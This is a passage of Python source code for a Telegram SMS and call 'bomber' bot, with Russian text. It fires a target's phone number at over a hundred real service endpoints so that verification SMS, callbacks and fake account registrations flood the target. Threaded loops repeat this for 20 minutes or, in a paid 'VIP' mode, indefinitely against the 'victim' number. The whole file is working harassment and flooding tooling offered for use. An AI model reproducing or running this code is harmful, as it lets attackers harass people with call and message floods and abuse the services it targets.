        phonemas=mask(str=phone, maska="+# (###) ###-##-##")
        requests.post("https://yaponchik.net/login/login.php",data={"login": "Y","countdown": "0","step": "phone","redirect": "/profile/","phone": phonemas, "code":""})
    except:
        pass
    try:
        requests.post("https://eda.yandex/api/v1/user/request_authentication_code", json={"phone_number": "+"+phone})
    except:
        pass
    try:
        requests.post("https://api.iconjob.co/api/auth/verification_code",json={"phone": phone})
    except:
        pass
    try:
        requests.post("https://cabinet.wi-fi.ru/api/auth/by-sms",data={"msisdn": phone})
    except:
        pass
    try:
        requests.post("https://ng-api.webbankir.com/user/v2/create",json={"lastName":"иванов","firstName":"иван","middleName":"иванович","mobilePhone":phone,"email":email,"smsCode":""})
    except:
        pass
    try:
        requests.post("https://shop.vsk.ru/ajax/auth/postSms/", data={"phone": phone})
    except:
        pass
    try:
        requests.post("https://b.utair.ru/api/v1/profile/", json={"phone":phone,"confirmationGDPRDate": int(str(datetime.datetime.now().timestamp()).split('.')[0]) })
        requests.post("https://b.utair.ru/api/v1/login/", json={"login":phone,"confirmation_type":"call_code"})
    except:
        pass
    try:
        # под сомнением
        phonemas=mask(str=phone, maska="#(###)###-##-##")
        requests.post("https://www.r-ulybka.ru/login/form_ajax.php", data={"action":"auth","phone":phonemas})

        phonemas=mask(str=phone, maska="+#(###)###-##-##")
        requests.post("https://www.r-ulybka.ru/login/form_ajax.php", data={"phone":"+7(915)350-99-08","action":"sendSmsAgain"})
    except:
        pass
    try:
        requests.post("https://uklon.com.ua/api/v1/account/code/send",headers={"client_id": "6289de851fc726f887af8d5d7a56c635"},json={"phone": phone},)
    except:
        pass
    try:
        requests.post("https://partner.uklon.com.ua/api/v1/registration/sendcode",headers={"client_id": "6289de851fc726f887af8d5d7a56c635"},json={"phone": phone})
    except:
        pass
    try:
        requests.post("https://secure.ubki.ua/b2_api_xml/ubki/auth",json={"doc": {"auth": {"mphone": "+" + phone,"bdate": "11.11.1999","deviceid": "00100","version": "1.0","source": "site","signature": "undefined",}}},headers={"Accept": "application/json"})
    except:
        pass
    try:
        phonemas=mask(str=phone, maska="+# (###) ###-##-##")
        requests.post("https://www.top-shop.ru/login/loginByPhone/",data={"phone": phonemas})
    except:
        pass
    try:
        phonemas=mask(str=phone, maska="8(###)###-##-##")
        requests.post("https://topbladebar.ru/user_account/ajax222.php?do=sms_code",data={"phone": phonemas})
    except:
        pass
    try:
        requests.post("https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru",data={"phone_number": phone})
    except:
        pass
    try:
        requests.post("https://m.tiktok.com/node-a/send/download_link",json={"slideVerify":0,"language":"ru","PhoneRegionCode":"7","Mobile":phone9,"page":{"pageName":"home","launchMode":"direct","trafficType":""}})
    except:
        pass
    try:
        requests.post("https://thehive.pro/auth/signup", json={"phone": "+"+phone})
    except:
        pass
    try:
        requests.post("https://msk.tele2.ru/api/validation/number/"+phone, json={"sender": "Tele2"},)
    except:
        pass
    try:
        phonemas=mask(phone, maska="+# (###) ### - ## - ##")
        requests.post("https://www.taxi-ritm.ru/ajax/ppp/ppp_back_call.php",data={"RECALL": "Y", "BACK_CALL_PHONE": phone})
    except:
        pass
    try:
        requests.post("https://www.tarantino-family.com/wp-admin/admin-ajax.php",data={"action": "callback_phonenumber", "phone": phone})
    except:
        pass
    try:
        phonemas=mask(str=phone, maska="(+#)##########")
        requests.post("https://www.tanuki.ru/api/",json={"header": {"version": "2.0","userId": f"002ebf12-a125-5ddf-a739-67c3c5d{randint(20000, 90000)}","agent": {"device": "desktop", "version": "undefined undefined"},"langId": "1","cityId": "9",},"method": {"name": "sendSmsCode"},"data": {"phone": phonemas, "type": 1}})
    except:
        pass
    try:
        requests.post("https://lk.tabris.ru/reg/", data={"action": "phone", "phone": phone})
    except:
        pass
    try:
        requests.post("https://tabasko.su/",data={"IS_AJAX": "Y","COMPONENT_NAME": "AUTH","ACTION": "GET_CODE","LOGIN": phone,})
    except:
        pass
    try:
        requests.post("https://www.sushi-profi.ru/api/order/order-call/",json={"phone": phone9, "name": name},)
    except:
        pass
    try:
        requests.post("https://client-api.sushi-master.ru/api/v1/auth/init",json={"phone": phone})
    except:
        pass
    try:
        phonemas=mask(str=phone9, maska="8(###)###-##-##")
        requests.post("https://xn--80aaispoxqe9b.xn--p1ai/user_account/ajax.php?do=sms_code",data={"phone": phonemas})
    except:
        pass
    try:
        phonemas=mask(str=phone9, maska="8 (###) ###-##-##")
        requests.post("http://sushigourmet.ru/auth",data={"phone": phonemas, "stage": 1})
    except:
        pass
    try:
        requests.post("https://sushifuji.ru/sms_send_ajax.php",data={"name": "false", "phone": phone})
    except:
        pass
    try:
        requests.get("https://auth.pizza33.ua/ua/join/check/",params={"callback": "angular.callbacks._1","email": email,"password": password,"phone": phone9,"utm_current_visit_started": 0,"utm_first_visit": 0,"utm_previous_visit": 0,"utm_times_visited": 0})
    except:
        pass
    try:
        requests.post("https://api.sunlight.net/v3/customers/authorization/",data={"phone": phone},)
    except:
        pass
    try:
        requests.get("https://suandshi.ru/mobile_api/register_mobile_user",params={"phone": phone,},)
    except:
        pass
    try:
        phonemas=mask(str=phone9, maska="8-###-###-##-##")
        requests.post("https://pizzasushiwok.ru/index.php",data={"mod_name": "registration","tpl": "restore_password","phone": phonemas})
    except:
        pass
    try:
        requests.get("https://www.sportmaster.ua/", params={"module": "users", "action": "SendSMSReg", "phone": phone})
    except:
        pass
    try:
        phonemas=mask(str=phone, maska="+# (###) ###-##-##")
        requests.get("https://www.sportmaster.ru/user/session/sendSmsCode.do", params={"phone": phonemas})
    except:
        pass
    try:
        requests.post("https://www.sms4b.ru/bitrix/components/sms4b/sms.demo/ajax.php",data={"demo_number": "+" + phone, "ajax_demo_send": "1"})
    except:
        pass
    try:
        requests.post("https://smart.space/api/users/request_confirmation_code/",json={"mobile": "+"+phone, "action": "confirm_mobile"})
    except:
        pass
    try:
        requests.post("https://shopandshow.ru/sms/password-request/",data={"phone": "+"+phone, "resend": 0})
    except:
        pass
    try:
        requests.post("https://shafa.ua/api/v3/graphiql",json={"operationName": "RegistrationSendSms","variables": {"phoneNumber": "+"+phone},"query": "mutation RegistrationSendSms($phoneNumber: String!) {\n  unauthorizedSendSms(phoneNumber: $phoneNumber) {\n    isSuccess\n    userToken\n    errors {\n      field\n      messages {\n        message\n        code\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n",})
    except:
        pass
    try:
        requests.post("https://shafa.ua/api/v3/graphiql",json={"operationName": "sendResetPasswordSms","variables": {"phoneNumber": "+"+phone},"query": "mutation sendResetPasswordSms($phoneNumber: String!) {\n  resetPasswordSendSms(phoneNumber: $phoneNumber) {\n    isSuccess\n    userToken\n    errors {\n      ...errorsData\n      __typename\n    }\n    __typename\n  }\n}\n\nfragment errorsData on GraphResponseError {\n  field\n  messages {\n    code\n    message\n    __typename\n  }\n  __typename\n}\n"})
    except:
        pass
    try:
        requests.post("https://sayoris.ru/?route=parse/whats", data={"phone": phone})
    except:
        pass
    try:
        requests.post("https://api.saurisushi.ru/Sauri/api/v2/auth/login",data={"data": {"login":phone9,"check":True,"crypto":{"captcha":"739699"}}})
    except:
        pass
    try:
        requests.post("https://pass.rutube.ru/api/accounts/phone/send-password/",json={"phone": "+"+phone})
    except:
        pass
    try:
        requests.post("https://rutaxi.ru/ajax_auth.html", data={"l": phone9, "c": "3"},)
    except:
        pass
    try:
        requests.post("https://rieltor.ua/api/users/register-sms/",json={"phone": phone, "retry": 0},)
    except:
        pass
    try:
        requests.post("https://richfamily.ru/ajax/sms_activities/sms_validate_phone.php",data={"phone": "+"+phone})
    except:
        pass
    try:
        phonemas=mask(str=phone, maska="+#(###)###-##-##")
        requests.post("https://www.rendez-vous.ru/ajax/SendPhoneConfirmationNew/",data={"phone": phonemas, "alien": "0"})
    except:
        pass
    try:
        requests.get("https://oapi.raiffeisen.ru/api/sms-auth/public/v1.0/phone/code",params={"number": phone})
    except:
        pass
    try:
        requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",json={"phone": phone})
    except:
        pass
    try:
        requests.get("https://sso.cloud.qlean.ru/http/users/requestotp",headers={"Referer": "https://qlean.ru/sso?redirectUrl=https://qlean.ru/"},params={"phone": phone,"clientId": "undefined","sessionId": str(randint(5000, 9999))})
    except:
        pass
    try:
        requests.post("https://www.prosushi.ru/php/profile.php",data={"phone": "+"+phone, "mode": "sms"})
    except:
        pass
    try:
        phonemas=mask(str=phone, maska="+#-###-###-##-##")
        requests.post("https://api.pozichka.ua/v1/registration/send",json={"RegisterSendForm": {"phone": phonemas}})
    except:
        pass
    try:
        phonemas=mask(str=phone, maska="+# (###) ###-##-##")
        requests.post("https://butovo.pizzapomodoro.ru/ajax/user/auth.php",data={"AUTH_ACTION": "SEND_USER_CODE","phone": phonemas})
    except:
        pass
    try:
        phonemas=mask(str=phone, maska="+# (###) ###-##-##")
        requests.post("https://pliskov.ru/Cube.MoneyRent.Orchard.RentRequest/PhoneConfirmation/SendCode",data={"phone": phonemas})
    except:
        pass
    try:
        requests.get("https://cabinet.planetakino.ua/service/sms", params={"phone": phone})
    except:
        pass
    try:
        phonemas=mask(str=phone9, maska="8-###-###-##-##")
        requests.post("https://pizzasushiwok.ru/index.php",data={"mod_name": "call_me","task": "request_call","name": name,"phone": phonemas})
    except:
        pass
    try:
        requests.post("https://pizzasinizza.ru/api/phoneCode.php", json={"phone": phone9})
    except:
        pass
    try:
        requests.post("https://pizzakazan.com/auth/ajax.php",data={"phone": "+"+phone, "method": "sendCode"})
    except:
        pass
    try:
        phonemas=mask(str=phone, maska="+# (###) ###-####")
        requests.post("https://pizza46.ru/ajaxGet.php",data={"phone": phonemas})
    except:
        pass
    try:
        requests.post("https://piroginomerodin.ru/index.php?route=sms/login/sendreg",data={"telephone": "+"+phone},)
    except:
        pass
    try:
        phonemas=mask(str=phone, maska="+#-###-###-##-##")
        requests.post("https://paylate.ru/registry",data={"mobile": phonemas,"first_name": name,"last_name": name,"nick_name": name,"gender-client": 1,"email": email,"action": "registry"})
    except:
        pass
    try:
        requests.post("https://www.panpizza.ru/index.php?route=account/customer/sendSMSCode",data={"telephone": "8"+phone9})
    except:
        pass
    try:
        requests.post("https://www.ozon.ru/api/composer-api.bx/_action/fastEntry",json={"phone": phone, "otpId": 0})
    except:
        pass
    try:
        phonemas=mask(str=phone, maska="+# (###) ###-####")
        requests.post("https://www.osaka161.ru/local/tools/webstroy.webservice.php",data={"name": "Auth.SendPassword","params[0]": phonemas})
    except:
        pass
    try:
        requests.post("https://ontaxi.com.ua/api/v2/web/client",json={"country": "UA","phone": phone[3:]})
    except:
        pass
    try:
        requests.get("https://secure.online.ua/ajax/check_phone/", params={"reg_phone": phone})
    except:
        pass
    try:
        requests.post(
            "https://www.ollis.ru/gql",
            json={{"query":"mutation { phone(number:\""+phone+"\", locale:ru) { token error { code message } } }"}})
    except:
        pass
    try:
        phonemas=mask(str=phone9, maska="8 (###) ###-##-##")
        requests.get("https://okeansushi.ru/includes/contact.php",params={"call_mail": "1","ajax": "1","name": name,"phone": phonemas,"call_time": "1","pravila2": "on"})
    except:
        pass
    try:
        requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data={"st.r.phone": "+"+phone})
    except:
        pass
    try:
        requests.post("https://nn-card.ru/api/1.0/covid/login", json={"phone": phone})
    except:
        pass
    try:
        requests.post("https://www.nl.ua",data={"component": "bxmaker.authuserphone.login","sessid": "bf70db951f54b837748f69b75a61deb4","method": "sendCode","phone": phone,"registration": "N"})
    except:
        pass
    try:
        requests.post("https://www.niyama.ru/ajax/sendSMS.php",data={"REGISTER[PERSONAL_PHONE]": phone,"code": "","sendsms": "Выслать код"})
    except:
        pass
    try:
        requests.post("https://account.my.games/signup_send_sms/", data={"phone": phone})
    except:
        pass
    try:
        requests.post("https://auth.multiplex.ua/login", json={"login": phone})
    except:
        pass
    try:
        requests.post("https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code",params={"msisdn": phone})
    except:
        pass
    try:
        requests.post("https://www.moyo.ua/identity/registration",data={"firstname": name,"phone": phone,"email": email})
    except:
        pass
    try:
        requests.post("https://mos.pizza/bitrix/components/custom/callback/templates/.default/ajax.php",data={"name": name, "phone": phone})
    except:
        pass
    try:
        requests.post("https://www.monobank.com.ua/api/mobapplink/send",data={"phone": "+"+phone},)
    except:
        pass
    try:
        requests.post("https://moneyman.ru/registration_api/actions/send-confirmation-code",data="+"+phone)
    except:
        pass
    try:
        requests.post("https://my.modulbank.ru/api/v2/registration/nameAndPhone",json={"FirstName": name, "CellPhone": phone, "Package": "optimal"})
    except:
        pass
    try:
        requests.post("https://mobileplanet.ua/register",data={"klient_name": name,"klient_phone": "+"+phone,"klient_email": email})
    except:
        pass
    try:
        phonemas=mask(str=phone, maska="+# (###) ### ## ##")
        requests.get(f"http://mnogomenu.ru/office/password/reset/"+phonemas)
    except:
        pass
    try:
        requests.get("https://my.mistercash.ua/ru/send/sms/registration",params={"number": "+"+phone})
    except:
        pass
    try:
        requests.get("https://menza-cafe.ru/system/call_me.php",params={"fio": name, "phone": phone, "phone_number": "1"})
    except:
        pass
    try:
        requests.post("https://www.menu.ua/kiev/delivery/registration/direct-registration.html",data={"user_info[fullname]": name,"user_info[phone]": phone,"user_info[email]": email,"user_info[password]": password,"user_info[conf_password]": password})
    except:
        pass
    try:
        requests.post("https://www.menu.ua/kiev/delivery/profile/show-verify.html",data={"phone": phone, "do": "phone"})
    except:
        pass
    try:
        phonemas=mask(str=phone, maska="+# ### ### ## ##")
        requests.get("https://makimaki.ru/system/callback.php",params={"cb_fio": name,"cb_phone": phonemas})
    except:
        pass
    try:
        requests.post("https://makarolls.ru/bitrix/components/aloe/aloe.user/login_new.php",data={"data": phone, "metod": "postreg"})
    except:
        pass
    try:
        requests.post("https://api-rest.logistictech.ru/api/v1.1/clients/request-code",json={"phone": phone},headers={"Restaurant-chain": "c0ab3d88-fba8-47aa-b08d-c7598a3be0b9"})
    except:
        pass
    try:
        requests.post("https://loany.com.ua/funct/ajax/registration/code",data={"phone":phone})
    except:
        pass
    try:
        requests.post("https://rubeacon.com/api/app/5ea871260046315837c8b6f3/middle",json={"url": "/api/client/phone_verification","method": "POST","data": {"client_id": 5646981, "phone": phone, "alisa_id": 1},"headers": {"Client-Id": 5646981,"Content-Type": "application/x-www-form-urlencoded"}})
    except:
        pass
    try:
        requests.post("https://lenta.com/api/v1/authentication/requestValidationCode",json={"phone": "+"+phone})
    except:
        pass
    try:
        requests.post("https://koronapay.com/transfers/online/api/users/otps",data={"phone": phone})
    except:
        pass
    try:
        requests.post("https://api.kinoland.com.ua/api/v1/service/send-sms",headers={"Agent": "website"},json={"Phone":phone, "Type": 1})
    except:
        pass
    try:
        phonemas=mask(str=phone, maska="# (###) ###-##-##")
        requests.post("https://kilovkusa.ru/ajax.php",params={"block": "auth", "action": "send_register_sms_code", "data_type": "json"},data={"phone": phonemas })
    except:
        pass
    try:
        requests.post("https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms",json={"phone": "+"+phone})
    except:
        pass
    try:
        requests.post("https://kaspi.kz/util/send-app-link", data={"address": phone9})
    except:
        pass
    try:
        requests.post("https://app.karusel.ru/api/v1/phone/", data={"phone": phone})
    except:
        pass
    try:
        requests.post("https://izi.ua/api/auth/register",json={"phone": "+"+phone,"name": name,"is_terms_accepted": True})
    except:
        pass
    try:
        requests.post("https://izi.ua/api/auth/sms-login", json={"phone": "+"+phone})
    except:
        pass
    try:
        requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone":phone})
    except:
        pass
    try:
        phonemas=mask(str=phone, maska="+## (###) ###-##-##")
        requests.post("https://iqlab.com.ua/session/ajaxregister",data={"cellphone": phonemas})
    except:
        pass
    try:
        requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword",data={"password": password,"application": "lkp","login": "+"+phone})
    except:
        pass
    try:
        requests.post("https://www.ingos.ru/api/v1/lk/auth/register/fast/step2",headers={"Referer": "https://www.ingos.ru/cabinet/registration/personal"},json={"Birthday": "1986-07-10T07:19:56.276+02:00","DocIssueDate": "2004-02-05T07:19:56.276+02:00","DocNumber": randint(500000, 999999),"DocSeries": randint(5000, 9999),"FirstName": name,"Gender": "M","LastName": name,"SecondName": name,"Phone": phone9,"Email": email})
    except:
        pass
    try:
        requests.post("https://informatics.yandex/api/v1/registration/confirmation/phone/send/",data={"country": "RU","csrfmiddlewaretoken": "","phone": phone})
    except:
        pass
    try:
        requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",data={"mode": "request","phone": "+"+phone,"phone_permission": "unknown","stream_id": 0,"v": 3,"appversion": "3.20.6","osversion": "unknown","devicemodel": "unknown"})
    except:
        pass
    try:
        requests.post("https://api.imgur.com/account/v1/phones/verify",json={"phone_number": phone, "region_code": "RU"})
    except:
        pass
    try:
        requests.post("https://www.icq.com/smsreg/requestPhoneValidation.php",data={"msisdn": phone,"locale": "en","countryCode": "ru","version": "1","k": "ic1rtwz1s1Hj1O0r","r": "46763"})
    except:
        pass
    try:
        requests.get("https://api.hmara.tv/stable/entrance", params={"contact": phone})
    except:
        pass
    try:
        requests.post("https://helsi.me/api/healthy/accounts/login",json={"phone": phone, "platform": "PISWeb"})
    except:
        pass
    try:
        requests.post("https://www.hatimaki.ru/register/",data={"REGISTER[LOGIN]": phone,"REGISTER[PERSONAL_PHONE]": phone,"REGISTER[SMS_CODE]": "","resend-sms": "1","REGISTER[EMAIL]": "","register_submit_button": "Зарегистрироваться"})
    except:
        pass
    try:
        requests.post("https://guru.taxi/api/v1/driver/session/verify",json={"phone": {"code": 1, "number": phone9}},)
    except:
        pass
    try:
        requests.post("https://crm.getmancar.com.ua/api/veryfyaccount",json={"phone": "+"+phone,"grant_type": "password","client_id": "gcarAppMob","client_secret": "SomeRandomCharsAndNumbersMobile"})
    except:
        pass
    try:
        requests.post("https://friendsclub.ru/assets/components/pl/connector.php",data={"casePar": "authSendsms", "MobilePhone": "+"+phone})
    except:
        pass
    try:
        phonemas=mask(str=phone, maska="+# (###) ###-##-##")
        requests.post("https://foodband.ru/api?call=calls",data={"customerName": name,"phone": phonemas,"g-recaptcha-response": ""})
    except:
        pass
    try:
        requests.get("https://foodband.ru/api/",params={"call": "customers/sendVerificationCode","phone": phone9,"g-recaptcha-response": ""})
    except:
        pass
    try:
        requests.post("https://www.flipkart.com/api/5/user/otp/generate",headers={"Origin": "https://www.flipkart.com","X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 FKUA/website/41/website/Desktop"},data={"loginId": "+"+phone})
    except:
        pass
    try:
        requests.post("https://www.flipkart.com/api/6/user/signup/status",headers={"Origin": "https://www.flipkart.com","X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 FKUA/website/41/website/Desktop"},json={"loginId": "+"+phone, "supportAllStates": True})
    except:
        pass
    try:
        requests.post("https://fix-price.ru/ajax/register_phone_code.php",data={"register_call": "Y", "action": "getCode", "phone": "+"+phone})
    except:
        pass
    try:
        requests.get("https://findclone.ru/register", params={"phone": "+"+phone})
    except:
        pass
    try:
        requests.post("https://www.finam.ru/api/smslocker/sendcode",data={"phone": "+"+phone})
    except:
        pass
    try:
        phonemas=mask(str=phone, maska="+# (###) ###-##-##")
        requests.post("https://2407.smartomato.ru/account/session",json={"phone": phonemas,"g-recaptcha-response": None})
    except:
        pass
    try:
        requests.post("https://www.etm.ru/cat/runprog.html",data={"m_phone":phone9,"mode": "sendSms","syf_prog": "clients-services","getSysParam": "yes"})
    except:
        pass
    try:
        requests.get("https://api.eldorado.ua/v1/sign/",params={"login": phone,"step": "phone-check","fb_id": "null","fb_token": "null","lang": "ru"})
    except:
        pass
    try:
        phonemas=mask(str=phone, maska="+## (###) ###-##-##")
        requests.post("https://e-groshi.com/online/reg",data={"first_name": name,"last_name": name,"third_name": name,"phone": phonemas,"password": password,"password2": password})
    except:
        pass
    try:
        requests.post("https://vladimir.edostav.ru/site/CheckAuthLogin",data={"phone_or_email": "+"+phone})
    except:
        pass
    try:
        requests.post("https://api.easypay.ua/api/auth/register",json={"phone": phone, "password": password})
    except:
        pass
    try:
        requests.post("https://my.dianet.com.ua/send_sms/", data={"phone": phone})
    except:
        pass
    try:
        requests.post("https://api.delitime.ru/api/v2/signup",data={"SignupForm[username]": phone, "SignupForm[device_type]": 3})
    except:
        pass
    try:
        phonemas=mask(str=phone, maska="+# (###) ###-##-##")
        requests.post("https://api.creditter.ru/confirm/sms/send",json={"phone": phonemas,"type": "register"})
    except:
        pass
    try:
        requests.post("https://clients.cleversite.ru/callback/run.php",data={"siteid": "62731","num":phone,"title": "Онлайн-консультант","referrer": "https://m.cleversite.ru/call"})
    except:
        pass
    try:
        requests.post("https://city24.ua/personalaccount/account/registration",data={"PhoneNumber": phone})
    except:
        pass
    try:
        requests.post(f"https://www.citilink.ru/registration/confirm/phone/+{phone}/")
    except:
        pass
    try:
        phonemas=mask(str=phone, maska="+# (###) ###-##-##")
        requests.post("https://cinema5.ru/api/phone_code",data={"phone": phonemas})
    except:
        pass
    try:
        requests.post("https://api.cian.ru/sms/v1/send-validation-code/",json={"phone": "+"+phone, "type": "authenticateCode"})
    except:
        pass
    try:
        requests.post("https://api.carsmile.com/",json={"operationName": "enterPhone","variables": {"phone": phone},"query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"})
    except:
        pass
    try:
        requests.get("https://it.buzzolls.ru:9995/api/v2/auth/register",params={"phoneNumber": "+"+phone,},headers={"keywordapi": "ProjectVApiKeyword", "usedapiversion": "3"})
    except:
        pass
    try:
        phonemas=mask(str=phone9, maska="(###)###-##-##")
        requests.post("https://bluefin.moscow/auth/register/",data={"phone": phonemas, "sendphone": "Далее"})
    except:
        pass
    try:
        requests.post("https://app.benzuber.ru/login", data={"phone": "+"+phone})
    except:
        pass
    try:
        phonemas=mask(str=phone, maska="+# (###) ###-##-##")
        requests.post("https://bartokyo.ru/ajax/login.php",data={"user_phone": phonemas})
    except:
        pass
    try:
        requests.post("https://bamper.by/registration/?step=1",data={"phone": "+"+phone,"submit": "Запросить смс подтверждения","rules": "on"})
    except:
        pass
    try:
        phonemas=mask(str=phone9, maska="(###) ###-##-##")
        requests.get("https://avtobzvon.ru/request/makeTestCall",params={"to": phonemas})
    except:
        pass
    try:
        phonemas=mask(str=phone, maska="+# (###) ###-##-##")
        requests.post("https://oauth.av.ru/check-phone",json={"phone": phonemas})
    except:
        pass
    try:
        requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",data={"phone": phone})
    except:
        pass
    try:
        phonemas=mask(str=phone, maska="+# (###) ###-##-##")
        requests.post("https://apteka.ru/_action/auth/getForm/",data={"form[NAME]": "","form[PERSONAL_GENDER]": "","form[PERSONAL_BIRTHDAY]": "","form[EMAIL]": "","form[LOGIN]": phonemas,"form[PASSWORD]": password,"get-new-password": "Получите пароль по SMS","user_agreement": "on","personal_data_agreement": "on","formType": "simple","utc_offset": "120"})
    except:
        pass
def start_spam(chat_id, phone_number, force):
    running_spams_per_chat_id.append(chat_id)
    bot.send_message(chat_id, f'‍📱 Номер жертвы: <code>+{phone_number}</code>\n⏱ Продолжительность: <code>20 минут</code>\n💥 Атака запущенa!', parse_mode='HTML')
    end = datetime.now() + timedelta(minutes = 20)
    print(f'[@'+str(bot_username)+'] Free Пользователь '+str(chat_id)+' начал бомбить '+str(phone_number))
    while (datetime.now() < end) or (force and chat_id==owner_id):
        if chat_id not in running_spams_per_chat_id:
            break
        send_for_number(phone_number)
    
    THREADS_AMOUNT[0] -= 1
    try:
        running_spams_per_chat_id.remove(chat_id)
    except Exception:
        pass

def start_spam_vip(chat_id, phone_number, force):
    running_spams_per_chat_id.append(chat_id)
    bot.send_message(chat_id, f'‍💎 VIP MODE \n📱 Номер жертвы: <code>+{phone_number}</code>\n⏱ Продолжительность: <code>∞</code>\n💥 Атака запущенa!', parse_mode='HTML')
    print(f'[@'+str(bot_username)+'] VIP Пользователь '+str(chat_id)+' начал бомбить '+str(phone_number))
    end = datetime.now() + timedelta(minutes = 999)
    while (datetime.now() < end) or (force and chat_id==owner_id):
        if chat_id not in running_spams_per_chat_id:
            break
        send_for_number_vip(phone_number)
    
    THREADS_AMOUNT[0] -= 1
    try:
        running_spams_per_chat_id.remove(chat_id)
    except Exception:
        pass

def spam_handler(phone, chat_id, force):
    if int(chat_id) in running_spams_per_chat_id:
        bot.send_message(chat_id, '🛑 Вы уже начали рассылку спама. Дождитесь окончания или нажмите "Остановить атаку ❌" и попробуйте снова')
        return

    if THREADS_AMOUNT[0] < THREADS_LIMIT:
        x = Thread(target=start_spam, args=(chat_id, phone, force))
        threads.append(x)
        THREADS_AMOUNT[0] += 1
        x.start()
    else:
        bot.send_message(chat_id, '🛑 Сервера сейчас перегружены. Попытайтесь снова через несколько минут.')
        print('[@'+str(bot_username)+'] Максимальное количество тредов исполняется. Действие отменено.')

def spam_handler_vip(phone, chat_id, force):
    if int(chat_id) in running_spams_per_chat_id:
        bot.send_message(chat_id, '🛑 Вы уже начали рассылку спама. Дождитесь окончания или нажмите "Остановить атаку [VIP] ❌" и попробуйте снова')
        return

    if THREADS_AMOUNT[0] < THREADS_LIMIT:
        x = Thread(target=start_spam_vip, args=(chat_id, phone, force))
        threads.append(x)
        THREADS_AMOUNT[0] += 1
        x.start()
    else:
        bot.send_message(chat_id, '🛑 Сервера сейчас перегружены. Попытайтесь снова через несколько минут.')
        print('[@'+str(bot_username)+'] Максимальное количество тредов исполняется. Действие отменено.')

@bot.message_handler(content_types=['text'])
def handle_message_received(message):
    if AntiSpam(message) == True:
        chat_id = int(message.chat.id)
        text = message.text
        if message.chat.type == "private":
            save_chat_id(message.chat.id)
          #  some_var = bot.get_chat_member(group_id, message.chat.id)
          #  user_status = some_var.status
          #  inl_keyboard = types.InlineKeyboardMarkup()
          #  s = types.InlineKeyboardButton(text = 'Подписаться', url = 'https://t.me/ParatovBomber')
          #  inl_keyboard.add(s)
          #  if user_status == 'member' or user_status == 'administrator' or user_status =='creator':
            save_chat_id(message.chat.id)

            if text == '📲 Бомбить номер':
                keyboard = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
                boom = types.KeyboardButton(text='📲 Начать бомбить')
                stop = types.KeyboardButton(text='❗️ Остановить')
                menu = types.KeyboardButton(text='🔙 Вернуться назад')
                    
                keyboard.add(boom, stop)
                keyboard.add(menu)

                bot.send_message(message.chat.id, f'''🆓 Вы в бесплатной версии бомбера
Выберите действие:''', reply_markup=keyboard, parse_mode='HTML')

            if text == '📲 Начать бомбить' or text == 'Начать атаку [VIP] 💣':
                if str(message.text) in open('vip_id.txt').read():
                    bot.send_message(chat_id, 'Введите номер в формате:\n🇺🇦 380*********\n🇷🇺 79**********\n🇰🇿 77*********\n🇧🇾 375*********\n🇦🇲 374*********\n🇵🇱 44*********\n')
                else:
                    bot.send_message(chat_id, 'Введите номер в формате:\n🇺🇦 380*********\n🇷🇺 79**********\n🇰🇿 77*********\n🇧🇾 375*********\n🇦🇲 374*********\n🇵🇱 44*********\n')

            elif text == '❗️ Остановить' or text == 'Остановить атаку [VIP] ❌':
                if chat_id not in running_spams_per_chat_id:
                    bot.send_message(chat_id, '🛑 Вы еще не начинали спам')
                else:
                    running_spams_per_chat_id.remove(chat_id)
                    bot.send_message(chat_id, '✅ Спам остановлен')
                    print(f'[@'+str(bot_username)+'] Пользователь '+str(chat_id)+' остановил спам')
                    if chat_id not in running_spams_per_chat_id:
                        THREADS_AMOUNT[0] -= 1

            elif text == '🖥 Информация':
                numss = [line.split('\n')[0] for line in nums]
                numbers[0] = len(numss)
                keyboard = types.InlineKeyboardMarkup()
                tg_admin = types.InlineKeyboardButton(text="👨‍💻 Тех.поддержка", url="https://t.me/ParatovBomberSupport_bot")
                reklama = types.InlineKeyboardButton(text="⚡️ Реклама в боте", url="https://t.me/ParatovBomberSupport_bot")
                keyboard.add(reklama)
                keyboard.add(tg_admin)
                bot.send_message(chat_id, f'''<b>Статистика отображается в реальном времени!</b>

🙋‍♂️ Пользователей‍: <code>{users_amount[0]+7067}</code>

⚙️ Работоспособность сервисов:
🇺🇦 UA: ✅  🇷🇺 RU: ✅  🇰🇿 KZ: ✅
🇧🇾 BY: ✅  🇦🇲 AM: ✅  🇵🇱 PL: ✅
''', reply_markup=keyboard, parse_mode='HTML')

            elif 'Рассылка: ' in text and str(message.chat.id) in open('admin.txt').read():
                bot.send_message(logs_ch, f"Админ "+str(message.chat.id)+" начал рассылку.")
                msg = text.replace("Рассылка: ","")
                send_message_users(msg)
                print(f'[@'+str(bot_username)+'] Админ '+str(message.chat.id)+' начал рассылку.')

            elif text == '❗️VIP':
                if str(message.chat.id) in open('vip_id.txt').read():
                    keyboard = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
                    boom = types.KeyboardButton(text='Начать атаку [VIP] 💣')
                    stop = types.KeyboardButton(text='Остановить атаку [VIP] ❌')
                    whl = types.KeyboardButton(text='Защитить номер[VIP] 🛡')
                    menu = types.KeyboardButton(text='🔙 Вернуться назад')
                    
                    keyboard.add(boom, stop, whl)
                    keyboard.add(menu)
                    bot.send_message(message.chat.id, '💎 Вы в приватной версии бомбера\nВыберите действие:',  reply_markup=keyboard )
                else:
                    aaacho = types.InlineKeyboardMarkup()
